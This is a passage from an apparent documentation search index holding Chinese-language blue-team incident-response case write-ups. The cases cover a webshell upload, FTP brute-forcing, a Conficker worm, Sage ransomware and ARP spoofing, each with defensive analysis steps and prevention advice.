5\u3001\u8fd8\u539f\u653b\u51fb\u8005\u884c\u4e3a \u901a\u8fc7\u76f8\u5173\u6587\u4ef6\u7684\u8bbf\u95ee\u8bb0\u5f55\u8fdb\u884c\u5173\u8054\u5206\u6790\uff0c\u653b\u51fb\u8005\u901a\u8fc7 ueditor\u7f16\u8f91\u5668\u6210\u529f\u4e0a\u4f20webshell\u3002","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#0x03","text":"1\u3001 \u5220\u9664Webshell \u6e05\u695a\u5df2\u53d1\u73b0\u7684webshell\uff0c\u5e76\u5c1d\u8bd5\u67e5\u627e\u53ef\u80fd\u9690\u85cf\u7684webshell\u3002 2\u3001\u4ee3\u7801\u5b8c\u6574\u6027\u9a8c\u8bc1 \u6211\u4eec\u6765\u601d\u8003\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u514d\u6740\u7684Webshell\u9690\u85cf\u5728\u6570\u4ee5\u4e07\u884c\u7684\u4ee3\u7801\u4e2d\uff0c\u600e\u4e48\u641e\uff1f \u6587\u4ef6\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u68c0\u67e5\u7f51\u7ad9\u7684\u6e90\u7801\u662f\u5426\u88ab\u7be1\u6539\u8fc7\u3002 \u64cd\u4f5c\u8fc7\u7a0b\uff1a \u901a\u8fc7\u67e5\u770b\u670d\u52a1\u5668\u4e0a\u5df2\u90e8\u7f72\u7684\u6e90\u4ee3\u7801\u7248\u672c\uff0c\u627e\u7814\u53d1\u540c\u4e8b\u8981\u540c\u6837\u7248\u672c\u7684\u4ee3\u7801\u3002\u628a\u7eaf\u51c0\u6e90\u7801\u7684\u6240\u6709\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21hash\u503c\u4fdd\u5b58\uff0c\u518d\u5230\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u6b21hash\u503c\uff0c\u901a\u8fc7\u6bd4\u5bf9hash\u503c\uff0c\u8f93\u51fa\u65b0\u521b\u5efa\u7684/\u88ab\u4fee\u6539\u8fc7\u7684/\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 3\u3001\u7cfb\u7edf\u5165\u4fb5\u6392\u67e5 \u5bf9\u7cfb\u7edf\u505a\u4e00\u4e2a\u6574\u4f53\u6392\u67e5\uff0c\u786e\u8ba4\u662f\u5426\u5b58\u5728\u540e\u95e8 4\u3001\u4ee3\u7801\u4fee\u590d \u53cd\u9988\u7ed9\u76f8\u5173\u5f00\u53d1\u4eba\u5458\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002","title":"0x03 \u4e8b\u4ef6\u5904\u7406"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/","text":"\u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u00b6 0x00 \u524d\u8a00 \u00b6 FTP\u662f\u4e00\u4e2a\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff0c\u7528\u6237\u901a\u8fc7FTP\u53ef\u4ece\u5ba2\u6237\u673a\u7a0b\u5e8f\u5411\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u4f20\u6216\u4e0b\u8f7d\u6587\u4ef6\uff0c\u5e38\u7528\u4e8e\u7f51\u7ad9\u4ee3\u7801\u7ef4\u62a4\u3001\u65e5\u5e38\u6e90\u7801\u5907\u4efd\u7b49\u3002\u5982\u679c\u653b\u51fb\u8005\u901a\u8fc7FTP\u533f\u540d\u8bbf\u95ee\u6216\u8005\u5f31\u53e3\u4ee4\u83b7\u53d6FTP\u6743\u9650\uff0c\u53ef\u76f4\u63a5\u4e0a\u4f20webshell\uff0c\u8fdb\u4e00\u6b65\u6e17\u900f\u63d0\u6743\uff0c\u76f4\u81f3\u63a7\u5236\u6574\u4e2a\u7f51\u7ad9\u670d\u52a1\u5668\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u4ece\u6628\u5929\u5f00\u59cb\uff0c\u7f51\u7ad9\u54cd\u5e94\u901f\u5ea6\u53d8\u5f97\u7f13\u6162\uff0c\u7f51\u7ad9\u670d\u52a1\u5668\u767b\u5f55\u4e0a\u53bb\u975e\u5e38\u5361\uff0c\u91cd\u542f\u670d\u52a1\u5668\u5c31\u80fd\u4fdd\u8bc1\u4e00\u6bb5\u65f6\u95f4\u7684\u6b63\u5e38\u8bbf\u95ee\uff0c\u7f51\u7ad9\u54cd\u5e94\u72b6\u6001\u65f6\u800c\u98de\u5feb\u65f6\u800c\u7f13\u6162\uff0c\u591a\u6570\u65f6\u95f4\u662f\u7f13\u6162\u7684\u3002\u9488\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u7cfb\u7edf\u65e5\u5fd7\u548c\u7f51\u7ad9\u65e5\u5fd7\uff0c\u662f\u6211\u4eec\u6392\u67e5\u5904\u7406\u7684\u91cd\u70b9\u3002\u67e5\u770bWindow\u5b89\u5168\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u91cf\u7684\u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 \u5b89\u5168\u65e5\u5fd7\u5206\u6790\uff1a \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\u3002 \u6253\u5f00\u5b89\u5168\u65e5\u5fd7\uff0c\u5728\u53f3\u8fb9\u70b9\u51fb\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\uff0c \u5728\u4e8b\u4ef6ID\u586b\u51654625\uff0c\u67e5\u8be2\u5230\u4e8b\u4ef6ID4625\uff0c\u4e8b\u4ef6\u6570177007\uff0c\u4ece\u8fd9\u4e2a\u6570\u636e\u53ef\u4ee5\u770b\u51fa\uff0c\u670d\u52a1\u5668\u6b63\u5219\u906d\u53d7\u66b4\u529b\u7834\u89e3\uff1a \u8fdb\u4e00\u6b65\u4f7f\u7528Log Parser\u5bf9\u65e5\u5fd7\u63d0\u53d6\u6570\u636e\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u7206\u7834\uff0c\u4f8b\u5982\u7528\u6237\u540d\uff1afxxx\uff0c\u5171\u8ba1\u8fdb\u884c\u4e8617826\u6b21\u53e3\u4ee4\u5c1d\u8bd5\uff0c\u653b\u51fb\u8005\u57fa\u4e8e\u201cfxxx\u201d\u8fd9\u6837\u4e00\u4e2a\u57df\u540d\u4fe1\u606f\uff0c\u6784\u9020\u4e86\u4e00\u7cfb\u5217\u7684\u7528\u6237\u540d\u5b57\u5178\u8fdb\u884c\u6709\u9488\u5bf9\u6027\u8fdb\u884c\u7206\u7834\uff0c\u5982\u4e0b\u56fe\uff1a \u8fd9\u91cc\u6211\u4eec\u7559\u610f\u5230\u767b\u5f55\u7c7b\u578b\u4e3a8\uff0c\u6765\u4e86\u89e3\u4e00\u4e0b\u767b\u5f55\u7c7b\u578b8\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u767b\u5f55\u7c7b\u578b8\uff1a\u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u8fd9\u79cd\u767b\u5f55\u8868\u660e\u8fd9\u662f\u4e00\u4e2a\u50cf\u7c7b\u578b3\u4e00\u6837\u7684\u7f51\u7edc\u767b\u5f55\uff0c\u4f46\u662f\u8fd9\u79cd\u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0cWindowsServer\u670d\u52a1\u662f\u4e0d\u5141\u8bb8\u901a\u8fc7\u660e\u6587\u9a8c\u8bc1\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u6253\u5370\u673a\u7684\uff0c\u636e\u6211\u6240\u77e5\u53ea\u6709\u5f53\u4ece\u4e00\u4e2a\u4f7f\u7528Advapi\u7684ASP\u811a\u672c\u767b\u5f55\u6216\u8005\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u57fa\u672c\u9a8c\u8bc1\u65b9\u5f0f\u767b\u5f55IIS\u624d\u4f1a\u662f\u8fd9\u79cd\u767b\u5f55\u7c7b\u578b\u3002\u201c\u767b\u5f55\u8fc7\u7a0b\u201d\u680f\u90fd\u5c06\u5217\u51faAdvapi\u3002 \u6211\u4eec\u63a8\u6d4b\u53ef\u80fd\u662fFTP\u670d\u52a1\uff0c\u901a\u8fc7\u67e5\u770b\u7aef\u53e3\u670d\u52a1\u53ca\u7ba1\u7406\u5458\u8bbf\u8c08\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u786e\u5b9e\u5bf9\u516c\u7f51\u5f00\u653e\u4e86FTP\u670d\u52a1\u3002 \u53e6\u5916\uff0c\u65e5\u5fd7\u5e76\u672a\u8bb0\u5f55\u66b4\u529b\u7834\u89e3\u7684IP\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Wireshark\u5bf9\u6355\u83b7\u5230\u7684\u6d41\u91cf\u8fdb\u884c\u5206\u6790\uff0c\u83b7\u53d6\u5230\u6b63\u5728\u8fdb\u884c\u7206\u7834\u7684IP\uff1a \u901a\u8fc7\u5bf9\u8fd1\u6bb5\u65f6\u95f4\u7684\u7ba1\u7406\u5458\u767b\u5f55\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u5982\u4e0b\uff1a \u7ba1\u7406\u5458\u767b\u5f55\u6b63\u5e38\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u5f02\u5e38\u767b\u5f55ip\uff0c\u8fd9\u91cc\u7684\u767b\u5f55\u7c7b\u578b10\uff0c\u4ee3\u8868\u8fdc\u7a0b\u7ba1\u7406\u684c\u9762\u767b\u5f55\u3002 \u53e6\u5916\uff0c\u901a\u8fc7\u67e5\u770bFTP\u7ad9\u70b9\uff0c\u53d1\u73b0\u53ea\u6709\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6\uff0c\u4e0e\u7ad9\u70b9\u76ee\u5f55\u5e76\u4e0d\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b\u9762\uff0c\u8fdb\u4e00\u6b65\u9a8c\u8bc1\u4e86FTP\u66b4\u529b\u7834\u89e3\u5e76\u672a\u6210\u529f\u3002 \u5e94\u6025\u5904\u7406\u63aa\u65bd\uff1a1\u3001\u5173\u95ed\u5916\u7f51FTP\u7aef\u53e3\u6620\u5c04 2\u3001\u5220\u9664\u672c\u5730\u670d\u52a1\u5668FTP\u6d4b\u8bd5 0x04 \u5904\u7406\u63aa\u65bd \u00b6 FTP\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u4f7f\u7528FTP\u4f20\u8f93\u6587\u4ef6\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668FTP\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002 \u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 \u8815\u866b\u75c5\u6bd2\u662f\u4e00\u79cd\u5341\u5206\u53e4\u8001\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\uff0c\u5b83\u662f\u4e00\u79cd\u81ea\u5305\u542b\u7684\u7a0b\u5e8f\uff08\u6216\u662f\u4e00\u5957\u7a0b\u5e8f\uff09\uff0c\u901a\u5e38\u901a\u8fc7\u7f51\u7edc\u9014\u5f84\u4f20\u64ad\uff0c\u6bcf\u5165\u4fb5\u5230\u4e00\u53f0\u65b0\u7684\u8ba1\u7b97\u673a\uff0c\u5b83\u5c31\u5728\u8fd9\u53f0\u8ba1\u7b97\u673a\u4e0a\u590d\u5236\u81ea\u5df1\uff0c\u5e76\u81ea\u52a8\u6267\u884c\u5b83\u81ea\u8eab\u7684\u7a0b\u5e8f\u3002 \u5e38\u89c1\u7684\u8815\u866b\u75c5\u6bd2\uff1a\u718a\u732b\u70e7\u9999\u75c5\u6bd2 \u3001\u51b2\u51fb\u6ce2/\u9707\u8361\u6ce2\u75c5\u6bd2\u3001conficker\u75c5\u6bd2\u7b49\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\u65e9\u4e0a\uff0c\u7ba1\u7406\u5458\u5728\u51fa\u53e3\u9632\u706b\u5899\u53d1\u73b0\u5185\u7f51\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u5883\u5916IP\u53d1\u8d77\u4e3b\u52a8\u8fde\u63a5\uff0c\u5185\u7f51\u73af\u5883\uff0c\u65e0\u6cd5\u8fde\u901a\u5916\u7f51\uff0c\u65e0\u56fe\u8111\u8865\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u5728\u51fa\u53e3\u9632\u706b\u5899\u770b\u5230\u7684\u670d\u52a1\u5668\u5185\u7f51IP\uff0c\u9996\u5148\u5c06\u4e2d\u75c5\u6bd2\u7684\u4e3b\u673a\u4ece\u5185\u7f51\u65ad\u5f00\uff0c\u7136\u540e\u767b\u5f55\u8be5\u670d\u52a1\u5668\uff0c\u6253\u5f00D\u76fe_web\u67e5\u6740\u67e5\u770b\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u672c\u5730\u5411\u5916\u7f51IP\u53d1\u8d77\u5927\u91cf\u7684\u4e3b\u52a8\u8fde\u63a5\uff1a \u901a\u8fc7\u7aef\u53e3\u5f02\u5e38\uff0c\u8ddf\u8e2a\u8fdb\u7a0bID\uff0c\u53ef\u4ee5\u627e\u5230\u8be5\u5f02\u5e38\u7531svchost.exe windows\u670d\u52a1\u4e3b\u8fdb\u7a0b\u5f15\u8d77\uff0csvchost.exe\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42\uff1a \u8fd9\u91cc\u6211\u4eec\u63a8\u6d4b\u53ef\u4ee5\u7cfb\u7edf\u8fdb\u7a0b\u88ab\u75c5\u6bd2\u611f\u67d3\uff0c\u4f7f\u7528\u5361\u5df4\u65af\u57fa\u75c5\u6bd2\u67e5\u6740\u5de5\u5177\uff0c\u5bf9\u5168\u76d8\u6587\u4ef6\u8fdb\u884c\u67e5\u6740\uff0c\u53d1\u73b0c:\\windows\\system32\\qntofmhz.dll\u5f02\u5e38\uff1a \u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\uff08 http://www.virscan.org/ \uff09 \u5bf9\u8be5\u6587\u4ef6\u8fdb\u884c\u626b\u63cf: \u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\uff0c\u4e0b\u8f7dconficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u695a\u75c5\u6bd2\u3002 \u5927\u81f4\u7684\u5904\u7406\u6d41\u7a0b\u5982\u4e0b: 1\u3001\u53d1\u73b0\u5f02\u5e38\uff1a\u51fa\u53e3\u9632\u706b\u5899\u3001\u672c\u5730\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u4e3b\u52a8\u5411\u5916\u7f51\u53d1\u8d77\u5927\u91cf\u8fde\u63a5 2\u3001\u75c5\u6bd2\u67e5\u6740\uff1a\u5361\u5df4\u65af\u57fa\u5168\u76d8\u626b\u63cf\uff0c\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6 3\u3001\u786e\u8ba4\u75c5\u6bd2\uff1a\u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u5bf9\u8be5\u6587\u4ef6\u626b\u63cf\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\u3002 4\u3001\u75c5\u6bd2\u5904\u7406\uff1a\u4f7f\u7528conficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u9664\u75c5\u6bd2\u3002 0x04 \u9884\u9632\u5904\u7406\u63aa\u65bd \u00b6 \u5728\u653f\u5e9c\u3001\u533b\u9662\u5185\u7f51\uff0c\u4f9d\u7136\u5b58\u5728\u7740\u4e00\u4e9b\u5f88\u53e4\u8001\u7684\u611f\u67d3\u6027\u75c5\u6bd2\uff0c\u5982\u4f55\u4fdd\u62a4\u7535\u8111\u4e0d\u53d7\u75c5\u6bd2\u611f\u67d3\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u4e0d\u4f7f\u7528\u6765\u5386\u4e0d\u660e\u7684\u8f6f\u4ef6\uff0c\u4e0d\u968f\u610f\u63a5\u5165\u672a\u7ecf\u67e5\u6740\u7684U\u76d8 3\u3001\u5b9a\u671f\u5bf9windows\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff0c\u4e0d\u7ed9\u75c5\u6bd2\u53ef\u4e58\u4e4b\u673a 4\u3001\u505a\u597d\u91cd\u8981\u6587\u4ef6\u7684\u5907\u4efd\uff0c\u5907\u4efd\uff0c\u5907\u4efd\u3002 \u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 \u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u4e00\u79cd\u65b0\u578b\u7535\u8111\u75c5\u6bd2\uff0c\u4e3b\u8981\u4ee5\u90ae\u4ef6\u3001\u7a0b\u5e8f\u6728\u9a6c\u3001\u7f51\u9875\u6302\u9a6c\u7684\u5f62\u5f0f\u8fdb\u884c\u4f20\u64ad\u3002\u8be5\u75c5\u6bd2\u6027\u8d28\u6076\u52a3\u3001\u5371\u5bb3\u6781\u5927\uff0c\u4e00\u65e6\u611f\u67d3\u5c06\u7ed9\u7528\u6237\u5e26\u6765\u65e0\u6cd5\u4f30\u91cf\u7684\u635f\u5931\u3002\u8fd9\u79cd\u75c5\u6bd2\u5229\u7528\u5404\u79cd\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u6587\u4ef6\u8fdb\u884c\u52a0\u5bc6\uff0c\u88ab\u611f\u67d3\u8005\u4e00\u822c\u65e0\u6cd5\u89e3\u5bc6\uff0c\u5fc5\u987b\u62ff\u5230\u89e3\u5bc6\u7684\u79c1\u94a5\u624d\u6709\u53ef\u80fd\u7834\u89e3\u3002\u81eaWannaCry\u52d2\u7d22\u75c5\u6bd2\u5728\u5168\u7403\u7206\u53d1\u4e4b\u540e\uff0c\u5404\u79cd\u53d8\u79cd\u53ca\u65b0\u578b\u52d2\u7d22\u75c5\u6bd2\u5c42\u51fa\u4e0d\u7a77\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\u65e9\u4e0a\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u6253\u5f00OA\u7cfb\u7edf\uff0c\u9996\u9875\u8bbf\u95ee\u5f02\u5e38\uff0c\u663e\u793a\u4e71\u7801\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u90fd\u88ab\u52a0\u5bc6\u4e3a.sage\u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a!HELP_SOS.hta\u6587\u4ef6\uff0c\u6253\u5305\u4e86\u90e8\u5206\u6837\u672c\uff1a \u6253\u5f00!HELP_SOS.hta\u6587\u4ef6\uff0c\u663e\u793a\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u57fa\u672c\u53ef\u4ee5\u786e\u8ba4\u662f\u670d\u52a1\u5668\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u4e0a\u4f20\u6837\u672c\u5230360\u52d2\u7d22\u75c5\u6bd2\u7f51\u7ad9\uff08 http://lesuobingdu.360.cn \uff09\u8fdb\u884c\u5206\u6790\uff1a\u786e\u8ba4web\u670d\u52a1\u5668\u4e2d\u4e86sage\u52d2\u7d22\u75c5\u6bd2\uff0c\u76ee\u524d\u6682\u65f6\u65e0\u6cd5\u89e3\u5bc6\u3002 \u7edd\u5927\u591a\u6570\u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u65e0\u6cd5\u89e3\u5bc6\u7684\uff0c\u4e00\u65e6\u88ab\u52a0\u5bc6\uff0c\u5373\u4f7f\u652f\u4ed8\u4e5f\u4e0d\u4e00\u5b9a\u80fd\u591f\u83b7\u5f97\u89e3\u5bc6\u5bc6\u94a5\u3002\u5728\u5e73\u65f6\u8fd0\u7ef4\u4e2d\u5e94\u79ef\u6781\u505a\u597d\u5907\u4efd\u5de5\u4f5c\uff0c\u6570\u636e\u5e93\u4e0e\u6e90\u7801\u5206\u79bb\uff08\u7c7b\u4f3cOA\u7cfb\u7edf\u9644\u4ef6\u8d44\u6e90\u4e5f\u5f88\u91cd\u8981\uff0c\u4e5f\u8981\u5907\u4efd\uff09\u3002 \u9047\u5230\u4e86\uff0c\u522b\u6025\uff0c\u8bd5\u4e00\u8bd5\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\uff1a \u201c\u62d2\u7edd\u52d2\u7d22\u8f6f\u4ef6\u201d\u7f51\u7ad9 https://www.nomoreransom.org/zh/index.html 360\u5b89\u5168\u536b\u58eb\u52d2\u7d22\u75c5\u6bd2\u4e13\u9898 http://lesuobingdu.360.cn 0x04 \u9632\u8303\u63aa\u65bd \u00b6 \u4e00\u65e6\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u6587\u4ef6\u4f1a\u88ab\u9501\u6b7b\uff0c\u6ca1\u6709\u529e\u6cd5\u6b63\u5e38\u8bbf\u95ee\u4e86\uff0c\u8fd9\u65f6\u5019\uff0c\u4f1a\u7ed9\u4f60\u5e26\u6765\u6781\u5927\u7684\u56f0\u607c\u3002\u4e3a\u4e86\u9632\u8303\u8fd9\u6837\u7684\u4e8b\u60c5\u51fa\u73b0\uff0c\u6211\u4eec\u7535\u8111\u4e0a\u8981\u5148\u505a\u597d\u4e00\u4e9b\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u4fdd\u6301\u76d1\u63a7\u5f00\u542f\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3\uff0c\u5982445\u3001135\u3001137\u3001138\u3001139\u30013389\u7b49\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6 4\u3001\u5907\u4efd\u3002\u91cd\u8981\u7684\u8d44\u6599\u4e00\u5b9a\u8981\u5907\u4efd\uff0c\u8c28\u9632\u8d44\u6599\u4e22\u5931 5\u3001\u5f3a\u5316\u7f51\u7edc\u5b89\u5168\u610f\u8bc6\uff0c\u964c\u751f\u94fe\u63a5\u4e0d\u70b9\u51fb\uff0c\u964c\u751f\u6587\u4ef6\u4e0d\u8981\u4e0b\u8f7d\uff0c\u964c\u751f\u90ae\u4ef6\u4e0d\u8981\u6253\u5f00 \u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 ARP\u75c5\u6bd2\u5e76\u4e0d\u662f\u67d0\u4e00\u79cd\u75c5\u6bd2\u7684\u540d\u79f0\uff0c\u800c\u662f\u5bf9\u5229\u7528arp\u534f\u8bae\u7684\u6f0f\u6d1e\u8fdb\u884c\u4f20\u64ad\u7684\u4e00\u7c7b\u75c5\u6bd2\u7684\u603b\u79f0\uff0c\u76ee\u524d\u5728\u5c40\u57df\u7f51\u4e2d\u8f83\u4e3a\u5e38\u89c1\u3002\u53d1\u4f5c\u7684\u65f6\u5019\u4f1a\u5411\u5168\u7f51\u53d1\u9001\u4f2a\u9020\u7684ARP\u6570\u636e\u5305\uff0c\u4e25\u91cd\u5e72\u6270\u5168\u7f51\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u5176\u5371\u5bb3\u751a\u81f3\u6bd4\u4e00\u4e9b\u8815\u866b\u75c5\u6bd2\u8fd8\u8981\u4e25\u91cd\u5f97\u591a\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\u65e9\u4e0a\uff0c\u5c0f\u4f19\u4f34\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u5fae\u4fe1\uff0c\u8bf4192.168.64.76 CPU\u73b0\u5728\u8d1f\u8f7d\u5f88\u9ad8\uff0c\u5728\u65e5\u5fd7\u5206\u6790\u5e73\u53f0\u67e5\u770b\u4e86\u4e00\u4e0b\u8fd9\u53f0\u670d\u52a1\u5668\u7684\u76f8\u5173\u65e5\u5fd7\uff0c\u6d41\u91cf\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\u66b4\u6da8\uff0c\u53d1\u73b0\u5927\u91cf137\u7aef\u53e3\u7684UDP\u653b\u51fb\u3002 0x02 \u5206\u6790\u8fc7\u7a0b \u00b6 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u9996\u5148\u67e5\u770b137\u7aef\u53e3\u5bf9\u5e94\u7684\u8fdb\u7a0b\uff0c\u8fdb\u7a0bID\u4e3a4\u5bf9\u5e94\u7684\u8fdb\u7a0b\u662fSYSTEM\uff0c\u4e8e\u662f\u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u5168\u76d8\u67e5\u6740\u3002 \u5361\u5df4\u65af\u57fa\u7eff\u8272\u7248\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \u5361\u5df4\u65af\u57fa\u3001360\u6740\u6bd2\u3001McAfee\u67e5\u6740\u65e0\u679c\uff0c\u624b\u5de5\u5c06\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1\u9879\u90fd\u7ffb\u4e86\u4e00\u904d\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u3002 \u672c\u5730\u4e0b\u8f7d\u4e86IpTool\u6293\u5305\u5de5\u5177\uff0c\u7b5b\u9009\u6761\u4ef6\uff1a \u534f\u8bae UDP \u7aef\u53e3 137 \u53ef\u4ee5\u660e\u663e\u7684\u770b\u51fa192.168.64.76\u53d1\u9001\u7684\u6570\u636e\u5305\u662f\u5f02\u5e38\u7684\uff0c192.168.64.76\u7684\u6570\u636e\u5305\u76ee\u7684\u5730\u5740\uff0c\u4e00\u76f4\u5728\u53d8\uff0c\u76ee\u7684MAC\u662f\u4e0d\u53d8\u7684\uff0c\u800c\u8fd9\u4e2aMAC\u5730\u5740\u5c31\u662f\u7f51\u5173\u7684MAC\u3002 \u7aef\u53e3137\u7684udp\u5305\u662fnetbios\u7684\u5e7f\u64ad\u5305\uff0c\u731c\u6d4b\uff1a\u53ef\u80fd\u662fARP\u75c5\u6bd2\uff0c\u7531\u672c\u673a\u5bf9\u5916\u7684ARP\u653b\u51fb\u3002 \u91c7\u7528\u63aa\u65bd\uff1a\u901a\u8fc7\u501f\u52a9\u4e00\u4e9b\u5b89\u5168\u8f6f\u4ef6\u6765\u5b9e\u73b0\u5c40\u57df\u7f51ARP\u68c0\u6d4b\u53ca\u9632\u5fa1\u529f\u80fd\u3002 \u670d\u52a1\u5668\u5b89\u5168\u72d7Windows\u7248\u4e0b\u8f7d\uff1a 